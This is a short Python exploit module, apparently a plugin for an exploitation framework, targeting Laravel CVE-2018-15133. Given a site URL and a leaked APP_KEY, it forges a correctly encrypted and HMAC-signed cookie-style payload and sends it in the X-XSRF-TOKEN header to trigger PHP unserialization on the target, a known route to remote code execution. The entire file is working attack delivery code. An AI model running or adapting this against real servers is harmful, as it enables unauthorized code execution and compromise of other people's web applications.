import hmac
import json
from base64 import b64encode, b64decode

from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from phpserialize import *
from requests import session

ses = session()

META = {
    'params': ['url:str', 'app_key:str'],
    'name': 'laravel1',
    'description': 'Laravel CVE-2018-15133',
    'version': ('<=5.5.40', '>=5.6.0', '<=5.6.29'),
}


def get_payload(app_key, payload):
    key = b64decode(app_key)
    data = pad(payload.encode(), 16)

    iv = b64encode(Random.new().read(AES.block_size))
    res = b64encode(AES.new(key, AES.MODE_CBC, b64decode(iv)).encrypt(data))
    mac = hmac.new(key, iv + res, 'sha256').hexdigest()

    payload = b64encode(json.dumps({
        'iv': iv.decode(), 'value': res.decode(), 'mac': mac
    }).encode()).decode()
    return payload


def unserialize(payload, url, app_key):
    return ses.get(url, headers={
        'X-XSRF-TOKEN': get_payload(app_key, payload)
    }).text
